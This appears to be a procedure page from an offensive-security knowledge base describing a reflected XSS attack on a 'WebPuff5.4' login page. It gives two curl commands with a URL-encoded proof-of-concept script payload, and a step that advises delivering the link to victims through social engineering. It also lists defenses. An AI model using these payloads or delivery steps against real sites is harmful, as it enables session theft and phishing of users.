---
id: proc-uuid-1390131
tags:
  - xss
  - reflected-xss
  - payload-injection
  - url-parameter
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-access-payload-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:21.016Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Login-URL-Parameter

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in the WebPuff5.4 login page by injecting a JavaScript payload into the 'url' parameter, which is not sanitized, leading to immediate execution of arbitrary code in the victim's browser upon page load.

## Description

The attack targets the login endpoint at /WebPuff5.4/Login?url=, where user input in the 'url' parameter is reflected directly into the HTML without encoding or validation. By URL-encoding a malicious payload, an attacker can trick the application into rendering executable JavaScript, such as an alert or more dangerous actions like stealing session cookies or redirecting to phishing sites. This was discovered in a U.S. Department of Defense system and reported via HackerOne. The procedure assumes the target is a web-accessible JSP-based application and requires no authentication for the login page.

## Requirements

1. Access to the target web server (public or internal network)
2. A browser or HTTP client like curl to send requests
3. Knowledge of URL encoding for payloads
4. Victim interaction (e.g., clicking a crafted link)

## Defense

Defensive measures and detection strategies:

- Implement output encoding for all user inputs reflected in HTML (e.g., use JSP's <c:out> or OWASP ESAPI)
- Validate and sanitize URL parameters to whitelist allowed characters and paths
- Deploy Content Security Policy (CSP) headers to restrict inline script execution
- Monitor for anomalous JavaScript payloads in access logs and use WAF rules to block common XSS patterns

## Objectives

1. Execute arbitrary JavaScript in the context of the login page
2. Enable follow-on attacks like session hijacking or phishing
3. Demonstrate vulnerability for reporting and remediation

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Encode the payload to bypass basic filters and inject script tags into the reflected 'url' parameter. The example payload creates an alert for proof-of-concept.

**Command** ([[commands/curl-access-payload-url]]):
```bash
curl "http://target.example.com/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E" -v
```

> This command sends a GET request to the login endpoint with the encoded payload. The '-v' flag provides verbose output to inspect the response. On success, the server responds with HTML containing the decoded payload: login.jsp"()&%<acx><ScRiPt>alert(9868)</ScRiPt>, which executes the alert when rendered in a browser.

### Step 2: Deliver and Execute the Payload

**Context**: Share the crafted URL with the victim (e.g., via email or social engineering) to trigger execution upon access.

**Command** ([[commands/curl-access-payload-url]]):
```bash
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "http://target.example.com/WebPuff5.4/Login?url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E" --output response.html
```

> Simulate browser access with a user-agent header and save the response to inspect for the injected script. Open response.html in a browser to verify execution. Expected: Alert box appears, confirming XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-access-payload-url]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[JavaScript]]
